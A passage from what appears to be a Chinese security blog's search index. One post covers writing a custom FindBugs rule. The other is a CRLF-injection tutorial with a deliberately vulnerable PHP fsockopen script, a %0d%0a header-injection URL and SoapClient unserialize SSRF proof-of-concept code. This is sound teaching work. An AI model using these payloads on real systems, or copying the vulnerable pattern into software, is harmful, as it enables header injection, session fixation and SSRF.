<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SAST-findbugs自定义规则</title>
      <link href="2021/05/31/SAST-findbug%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%84%E5%88%99/"/>
      <url>2021/05/31/SAST-findbug%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%84%E5%88%99/</url>
      
        <content type="html"><![CDATA[<p>findbugs主要是用来进行静态代码扫描，用作为SDL前期STAT检测工具还是不错的，在使用的过程中避免不了需要对扫描规则进行自定义，在网上查了好久好不容易查到一些资料，配合实践记录一下，只记录一下添加步骤流程，每一步细节不做深入。<span id="more"></span></p><h3 id="一、须知"><a href="#一、须知" class="headerlink" title="一、须知"></a>一、须知</h3><ul><li>由于 FindBugs 是分析编译后的 class 文件，也就是字节码文件。我们需要了解 FindBugs 底层的处理机制。根据FindBugs 官网文档描述，FindBugs 使用了BCEL来分析 Java 字节码文件。从 1.1 版本开始，FindBugs 也支持使用ASM字节码框架来编写 bug 探测器。</li><li>自定义规则思路：<ol><li>明确要定义的规则。</li><li>分析样例代码的字节码内容。</li><li>编写探测器。</li><li>将规则加入规则文件中。</li></ol></li></ul><h3 id="二、编写自定义扫描规则"><a href="#二、编写自定义扫描规则" class="headerlink" title="二、编写自定义扫描规则"></a>二、编写自定义扫描规则</h3><ul><li>因为findbugs是扫描的class文件，所以我们要添加自定义规则的话肯定要找到我们将要添加的规则的特征码是什么样的，所以我们需要一个可以查看class文件的工具。<br>这里推荐一个 Eclipse 上用来查看 java 文件字节码内容的插件：Bytecode Outline<br>官网地址：<a href="http://andrei.gmxhome.de/bytecode/index.html">http://andrei.gmxhome.de/bytecode/index.html</a><br>在安装完成后，可以通过 Bytecode 工具查看编译后的字节码文件内容。</li></ul><ol><li>例如：我们需要的特征字符如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GETSTATIC java&#x2F;lang&#x2F;System.out : Ljava&#x2F;io&#x2F;PrintStream;</span><br><span class="line">GETSTATIC java&#x2F;lang&#x2F;System.err : Ljava&#x2F;io&#x2F;PrintStream;</span><br></pre></td></tr></table></figure></li><li>通过刚才找到的关键语句，结合我们的逻辑，进行探测器编写：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">package edu.umd.cs.findbugs.detect;</span><br><span class="line"></span><br><span class="line">import org.apache.bcel.classfile.Code;</span><br><span class="line"></span><br><span class="line">import edu.umd.cs.findbugs.BugInstance;</span><br><span class="line">import edu.umd.cs.findbugs.BugReporter;</span><br><span class="line">import edu.umd.cs.findbugs.bcel.OpcodeStackDetector;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * @author yuanwei</span><br><span class="line"> * @category 代码中避免使用有类似System.out的输出语句</span><br><span class="line"> *&#x2F;</span><br><span class="line">public class ForbiddenSystemClass extends OpcodeStackDetector &#123;</span><br><span class="line">    BugReporter bugReporter;</span><br><span class="line"></span><br><span class="line">    public ForbiddenSystemClass(BugReporter bugReporter) &#123;</span><br><span class="line">        this.bugReporter &#x3D; bugReporter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * visit方法，在每次进入字节码方法的时候调用 在每次进入新方法的时候清空标志位</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @Override</span><br><span class="line">    public void visit(Code obj) &#123;</span><br><span class="line">        super.visit(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 每扫描一条字节码就会进入sawOpcode方法</span><br><span class="line">     * </span><br><span class="line">     * @param seen</span><br><span class="line">     *            字节码的枚举值</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @Override</span><br><span class="line">    public void sawOpcode(int seen) &#123;</span><br><span class="line">        if (seen &#x3D;&#x3D; GETSTATIC) &#123;</span><br><span class="line">            if (getClassConstantOperand().equals(&quot;java&#x2F;lang&#x2F;System&quot;)) &#123;</span><br><span class="line">                if(getNameConstantOperand().equals(&quot;out&quot;) || getNameConstantOperand()</span><br><span class="line">                        .equals(&quot;err&quot;))&#123;</span><br><span class="line">                    BugInstance bug &#x3D; new BugInstance(this, &quot;CJ_SYSTEMCLASS&quot;,</span><br><span class="line">                            NORMAL_PRIORITY).addClassAndMethod(this).addSourceLine(</span><br><span class="line">                                    this, getPC());</span><br><span class="line">                    bugReporter.reportBug(bug);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>将规则加入规则文件中<br>我们刚才在编写探测器的时候，已经给定了规则的名称CJ_SYSTEMCLASS。现在我们需要将这个规则添加在配置文件中。<br>配置 findbugs.xml：新增一个FindbugsPlugin<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FindbugsPlugin&gt;  </span><br><span class="line">  &lt;Detector class&#x3D;&quot;edu.umd.cs.findbugs.detect.ForbiddenSystemClass&quot;  speed&#x3D;&quot;fast&quot; reports&#x3D;&quot;CJ_SYSTEMCLASS&quot; hidden&#x3D;&quot;false&quot; &#x2F;&gt;  </span><br><span class="line">  &lt;BugPattern abbrev&#x3D;&quot;CJ_SYSTEMCLASS&quot; type&#x3D;&quot;CJ_SYSTEMCLASS&quot; category&#x3D;&quot;PERFORMANCE&quot; &#x2F;&gt;  </span><br><span class="line">&lt;&#x2F;FindbugsPlugin&gt; </span><br></pre></td></tr></table></figure>配置 message.xml：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;MessageCollection&gt;  </span><br><span class="line">  &lt;Plugin&gt;  </span><br><span class="line">    &lt;ShortDescription&gt;Default FindBugs plugin&lt;&#x2F;ShortDescription&gt;  </span><br><span class="line">    &lt;Details&gt;  </span><br><span class="line">    &lt;![CDATA[ </span><br><span class="line">    &lt;p&gt; </span><br><span class="line">    This plugin contains all of the standard FindBugs detectors. </span><br><span class="line">    &lt;&#x2F;p&gt; </span><br><span class="line">    ]]&gt;  </span><br><span class="line">    &lt;&#x2F;Details&gt;  </span><br><span class="line">  &lt;&#x2F;Plugin&gt;  </span><br><span class="line">    &lt;Detector class&#x3D;&quot;edu.umd.cs.findbugs.detect.ForbiddenSystemClass&quot;&gt;  </span><br><span class="line">       &lt;Details&gt;  </span><br><span class="line">        &lt;![CDATA[ </span><br><span class="line">        &lt;p&gt;代码不能出现System.out </span><br><span class="line">        &lt;p&gt;请使用log日志形式打印 </span><br><span class="line">        ]]&gt;  </span><br><span class="line">       &lt;&#x2F;Details&gt;  </span><br><span class="line">    &lt;&#x2F;Detector&gt;  </span><br><span class="line">    &lt;BugPattern type&#x3D;&quot;CJ_SYSTEMCLASS&quot;&gt;  </span><br><span class="line">        &lt;ShortDescription&gt;代码不能出现System.out&lt;&#x2F;ShortDescription&gt;  </span><br><span class="line">        &lt;LongDescription&gt;&#123;1&#125;代码不能出现System.out，请使用log形式输出&lt;&#x2F;LongDescription&gt;  </span><br><span class="line">        &lt;Details&gt;  </span><br><span class="line">      &lt;![CDATA[ </span><br><span class="line">        &lt;p&gt;不能使用System.out和System.err，请使用log&lt;&#x2F;p&gt; </span><br><span class="line">      ]]&gt;  </span><br><span class="line">        &lt;&#x2F;Details&gt;  </span><br><span class="line">      &lt;&#x2F;BugPattern&gt;  </span><br><span class="line">    &lt;BugCode abbrev&#x3D;&quot;CJ_SYSTEMCLASS&quot;&gt;影响性能的输出System.out&lt;&#x2F;BugCode&gt;  </span><br><span class="line">&lt;&#x2F;MessageCollection&gt;</span><br></pre></td></tr></table></figure></li><li>添加完规则之后使用ant对脚本进行打包：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line"> &lt;project name&#x3D;&quot;typestatechecker&quot; default&#x3D;&quot;dist&quot; basedir&#x3D;&quot;.&quot;&gt;</span><br><span class="line">    &lt;description&gt;Builds the Systemout Checker.&lt;&#x2F;description&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property file&#x3D;&quot;build.properties&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name&#x3D;&quot;src&quot; value&#x3D;&quot;src&quot;&#x2F;&gt;</span><br><span class="line">    &lt;property name&#x3D;&quot;etc&quot; value&#x3D;&quot;etc&quot;&#x2F;&gt;</span><br><span class="line">    &lt;property name&#x3D;&quot;bin&quot; value&#x3D;&quot;bin&quot;&#x2F;&gt;</span><br><span class="line">    &lt;property name&#x3D;&quot;dist.file&quot; value&#x3D;&quot;testFindBugs.jar&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;target name&#x3D;&quot;clean&quot; description&#x3D;&quot;Remove generated files&quot;&gt;</span><br><span class="line">        &lt;delete dir&#x3D;&quot;$&#123;bin&#125;&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;target&gt;</span><br><span class="line"></span><br><span class="line">    &lt;target name&#x3D;&quot;prep&quot; depends&#x3D;&quot;clean&quot; description&#x3D;&quot;Create required directories&quot;&gt;</span><br><span class="line">        &lt;mkdir dir&#x3D;&quot;$&#123;bin&#125;&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;target&gt;</span><br><span class="line"></span><br><span class="line">    &lt;path id&#x3D;&quot;build.src.main.path&quot;&gt;</span><br><span class="line">        &lt;pathelement location&#x3D;&quot;$&#123;findbugs.home&#125;&#x2F;lib&#x2F;findbugs.jar&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;path&gt;</span><br><span class="line"></span><br><span class="line">    &lt;target name&#x3D;&quot;build&quot; depends&#x3D;&quot;prep&quot; description&#x3D;&quot;Compile files&quot;&gt;</span><br><span class="line">        &lt;javac srcdir&#x3D;&quot;$&#123;src&#125;&quot;          classpathref&#x3D;&quot;build.src.main.path&quot;  destdir&#x3D;&quot;$&#123;bin&#125;&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;target&gt;</span><br><span class="line"></span><br><span class="line">    &lt;target name&#x3D;&quot;dist&quot; depends&#x3D;&quot;build&quot; description&#x3D;&quot;Create jar file&quot;&gt;</span><br><span class="line">        &lt;jar destfile&#x3D;&quot;$&#123;findbugs.home&#125;&#x2F;plugin&#x2F;$&#123;dist.file&#125;&quot;&gt;</span><br><span class="line">            &lt;fileset dir&#x3D;&quot;$&#123;bin&#125;&quot; &#x2F;&gt;</span><br><span class="line">            &lt;fileset dir&#x3D;&quot;$&#123;src&#125;&quot; &#x2F;&gt;</span><br><span class="line">            &lt;fileset dir&#x3D;&quot;$&#123;etc&#125;&quot; &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;jar&gt;</span><br><span class="line">    &lt;&#x2F;target&gt;</span><br><span class="line">&lt;&#x2F;project&gt;</span><br></pre></td></tr></table></figure></li><li>在ant脚本中定义了对dist.file打包成testFindBugs.jar，以及将打包后的jar放到plugin/目录下<br>ant命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ant dist</span><br></pre></td></tr></table></figure>进行编译</li></ol><p><img src="/images/pasted-49.png" alt="upload successful"></p><ol start="6"><li>使用ant进行启动扫描<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line"> &lt;project name&#x3D;&quot;typestatechecker&quot; default&#x3D;&quot;dist&quot; basedir&#x3D;&quot;.&quot;&gt;</span><br><span class="line">    &lt;description&gt;Builds the Systemout Checker.&lt;&#x2F;description&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property file&#x3D;&quot;build.properties&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name&#x3D;&quot;src&quot; value&#x3D;&quot;src&quot;&#x2F;&gt;</span><br><span class="line">    &lt;property name&#x3D;&quot;etc&quot; value&#x3D;&quot;etc&quot;&#x2F;&gt;</span><br><span class="line">    &lt;property name&#x3D;&quot;bin&quot; value&#x3D;&quot;bin&quot;&#x2F;&gt;</span><br><span class="line">    &lt;property name&#x3D;&quot;dist.file&quot; value&#x3D;&quot;testFindBugs.jar&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;target name&#x3D;&quot;clean&quot; description&#x3D;&quot;Remove generated files&quot;&gt;</span><br><span class="line">        &lt;delete dir&#x3D;&quot;$&#123;bin&#125;&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;target&gt;</span><br><span class="line"></span><br><span class="line">    &lt;target name&#x3D;&quot;prep&quot; depends&#x3D;&quot;clean&quot; description&#x3D;&quot;Create required directories&quot;&gt;</span><br><span class="line">        &lt;mkdir dir&#x3D;&quot;$&#123;bin&#125;&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;target&gt;</span><br><span class="line"></span><br><span class="line">    &lt;path id&#x3D;&quot;build.src.main.path&quot;&gt;</span><br><span class="line">        &lt;pathelement location&#x3D;&quot;$&#123;findbugs.home&#125;&#x2F;lib&#x2F;findbugs.jar&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;path&gt;</span><br><span class="line"></span><br><span class="line">    &lt;target name&#x3D;&quot;build&quot; depends&#x3D;&quot;prep&quot; description&#x3D;&quot;Compile files&quot;&gt;</span><br><span class="line">        &lt;javac srcdir&#x3D;&quot;$&#123;src&#125;&quot;          classpathref&#x3D;&quot;build.src.main.path&quot;  destdir&#x3D;&quot;$&#123;bin&#125;&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;target&gt;</span><br><span class="line"></span><br><span class="line">    &lt;target name&#x3D;&quot;dist&quot; depends&#x3D;&quot;build&quot; description&#x3D;&quot;Create jar file&quot;&gt;</span><br><span class="line">        &lt;jar destfile&#x3D;&quot;$&#123;findbugs.home&#125;&#x2F;plugin&#x2F;$&#123;dist.file&#125;&quot;&gt;</span><br><span class="line">            &lt;fileset dir&#x3D;&quot;$&#123;bin&#125;&quot; &#x2F;&gt;</span><br><span class="line">            &lt;fileset dir&#x3D;&quot;$&#123;src&#125;&quot; &#x2F;&gt;</span><br><span class="line">            &lt;fileset dir&#x3D;&quot;$&#123;etc&#125;&quot; &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;jar&gt;</span><br><span class="line">    &lt;&#x2F;target&gt;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &lt;!-- exec findbugs --&gt;</span><br><span class="line">    &lt;target name&#x3D;&quot;findbugs&quot; depends&#x3D;&quot;build&quot;&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;path id&#x3D;&quot;findbugs_lib&quot; &gt;</span><br><span class="line">            &lt;fileset dir&#x3D;&quot;$&#123;findbugs.home&#125;&#x2F;lib&#x2F;&quot; &gt;</span><br><span class="line">                &lt;include name&#x3D;&quot;*.jar&quot; &#x2F;&gt;</span><br><span class="line">            &lt;&#x2F;fileset&gt;</span><br><span class="line">        &lt;&#x2F;path&gt;</span><br><span class="line"></span><br><span class="line">        &lt;taskdef</span><br><span class="line">            name&#x3D;&quot;findbugs&quot;</span><br><span class="line">            classname&#x3D;&quot;edu.umd.cs.findbugs.anttask.FindBugsTask&quot;</span><br><span class="line">            classpathref&#x3D;&quot;findbugs_lib&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;findbugs</span><br><span class="line">            home&#x3D;&quot;$&#123;findbugs.home&#125;&quot;</span><br><span class="line">            output&#x3D;&quot;xml&quot;</span><br><span class="line">            outputFile&#x3D;&quot;$&#123;bin&#125;&#x2F;findbugs_result.xml&quot; &gt;</span><br><span class="line"></span><br><span class="line">            &lt;class location&#x3D;&quot;$&#123;bin&#125;&quot; &#x2F;&gt;</span><br><span class="line">            &lt;sourcePath path&#x3D;&quot;$&#123;src&#125;&quot; &#x2F;&gt;</span><br><span class="line">            </span><br><span class="line">        &lt;&#x2F;findbugs&gt;</span><br><span class="line">    &lt;&#x2F;target&gt;</span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;project&gt;</span><br></pre></td></tr></table></figure>使用ant命令：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ant findbugs</span><br></pre></td></tr></table></figure></li></ol><p><img src="/images/pasted-50.png" alt="upload successful"></p><hr><ul><li>参考来源  <a href="https://www.cnblogs.com/successjerry/p/5232007.html">findbugs自定义规则并配置实现检测</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CRLF注入浅析</title>
      <link href="2021/05/25/CRLF%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/"/>
      <url>2021/05/25/CRLF%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h3><ul><li>HTTP报文的结构：状态行和首部中的每行以CRLF结束，首部与主体之间由一空行分隔。或者理解为首部最后一个字段有两个CRLF，首部和主体由两个CRLF分隔。<br>CRLF注入漏洞，是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞（HTTP Response Splitting）。</li></ul><h3 id="二、HTTP报文基础知识"><a href="#二、HTTP报文基础知识" class="headerlink" title="二、HTTP报文基础知识"></a>二、HTTP报文基础知识</h3><ol><li><p>CRLF : 指的是 <font color=#FF0000>回车符</font>(CR，ASCII 13，\r，%0d) 和 <font color=#FF0000>换行符</font>(LF，ASCII 10，\n，%0a)。</p></li><li><p>CRLF : 源自打字机，表明行的结束，计算机出现后沿用了这个概念。</p></li><li><p>回车符：光标移到行首，</p></li><li><p>换行符：光标垂直移到下行。</p></li></ol><ul><li>键盘上的回车键(Enter)就可以执行该操作。但是不同的操作系统，行的结束符是不一样的。    </li></ul><ol start="5"><li><p>Windows：使用CRLF表示行的结束</p></li><li><p>Linux/Unix：使用LF表示行的结束</p></li><li><p>MacOS：早期使用CR表示，现在好像也用LF表示行的结束.</p></li></ol><ul><li>在HTTP规范中，行应该使用CRLF来结束。首部与主体由两个CRLF分隔，浏览器根据这两个CRLF来获取HTTP内容并显示。</li></ul><h3 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h3><ul><li><p>HTTP响应报文的结构是：状态行、响应头部和响应包体。在HTTP规范中，换行使用CRLF来表示。其中响应头部中响应头与响应头之间用一个CRLF分隔，响应头部中最后一个响应头和响应包体之间用两个CRLF分隔。</p></li><li><p>根据这个分割规律（用一个CRLF分隔的就是不同的响应头，用两个CRLF分隔的就是最后一个响应头和响应包体），如果一个响应头的value中有一个CRLF，那么这个响应头的CRLF之前的内容作为本响应头的value，而CRLF之后的内容则会被作为另一个响应头（或响应包体）处理。如果用户的输入会设置到某响应头中的value，那么通过添加CRLF就可以进行CRLF注入攻击。</p><p>  <img src="/images/pasted-33.png" alt="upload successful"></p></li></ul><h3 id="四、容易形成漏洞的点"><a href="#四、容易形成漏洞的点" class="headerlink" title="四、容易形成漏洞的点"></a>四、容易形成漏洞的点</h3><ol><li><p><strong><font color=#ff4500>PHP fsockopen() 函数</font></strong></p><ul><li><p>fsockopen($hostname,$port,$errno,$errstr,$timeout)– 用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。<br>fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p></li><li><p>服务端测试代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  &lt;?php</span><br><span class="line">     $host&#x3D;$_GET[&#39;url&#39;];</span><br><span class="line">     $fp &#x3D; fsockopen($host, 80, $errno, $errstr, 30);</span><br><span class="line">     if (!$fp) &#123;</span><br><span class="line">         echo &quot;$errstr ($errno)&lt;br &#x2F;&gt;\n&quot;;</span><br><span class="line">     &#125; else &#123;</span><br><span class="line">         $out &#x3D; &quot;GET &#x2F; HTTP&#x2F;1.1\r\n&quot;;</span><br><span class="line">         $out .&#x3D; &quot;Host: $host\r\n&quot;;</span><br><span class="line">         $out .&#x3D; &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">         fwrite($fp, $out);</span><br><span class="line">         while (!feof($fp)) &#123;</span><br><span class="line">             echo fgets($fp, 128);</span><br><span class="line">         &#125;</span><br><span class="line">         fclose($fp);</span><br><span class="line">     &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li><li><p>首先我们尝试访问正常的url：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?url&#x3D;192.168.249.3:4000</span><br></pre></td></tr></table></figure><p>可以看到在受害主机上发出的请求如图所示：<br><img src="/images/pasted-34.png" alt="upload successful"></p></li><li><p>接着我们访问带有CRLF注入的请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?url&#x3D;192.168.249.3:4000%0d%0aSet-Cookie:%20PHPSESSID&#x3D;whoami</span><br></pre></td></tr></table></figure></li><li><p>可以看到在受害主机上发出的请求如图所示：此时发送的请求产生了CRLF注入。HTTP规范中，行以CRLF结束。所以当检测到%0d%0a后，就认为 Host 首部字段这行结束了，Set-Cookie就会被认为是下一行，如下所示：<br><img src="/images/pasted-35.png" alt="upload successful"></p></li></ul></li><li><p><strong><font color=#ff4500>PHP SoapClient 类</font></strong></p><ul><li><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。</p></li><li><p>该类的构造函数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</span><br></pre></td></tr></table></figure><ul><li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。    </li></ul></li><li><p>知道上述两个参数的含义后，我们首先来发起一个正常的HTTP请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $a &#x3D; new SoapClient(null,array(&#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;47.101.57.11:4000&#x2F;aaa&#39;, &#39;uri&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;47.101.57.11:4000&#39;));</span><br><span class="line">   $b &#x3D; serialize($a);</span><br><span class="line">   echo $b;</span><br><span class="line">   $c &#x3D; unserialize($b);</span><br><span class="line">   $c-&gt;a();    &#x2F;&#x2F; 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="line">  ?&gt;</span><br></pre></td></tr></table></figure><p>发送一个正常的请求<br><img src="/images/pasted-36.png" alt="upload successful"></p></li><li><p>在 User-Agent 头部注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target &#x3D; &#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;&#39;;</span><br><span class="line">$a &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target, &#39;user_agent&#39; &#x3D;&gt; &quot;WHOAMI\r\nSet-Cookie: PHPSESSID&#x3D;whoami&quot;, &#39;uri&#39; &#x3D;&gt; &#39;test&#39;));</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c &#x3D; unserialize($b);</span><br><span class="line">$c-&gt;a();    &#x2F;&#x2F; 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>如下图所示，VPS 上监听到了请求，成功在HTTP头中插入了一个我们自定义的 cookie：<br><img src="/images/pasted-37.png" alt="upload successful"></p></li><li><p>注入发送 POST 数据包</p><ul><li>在HTTP协议中，HTTP Header 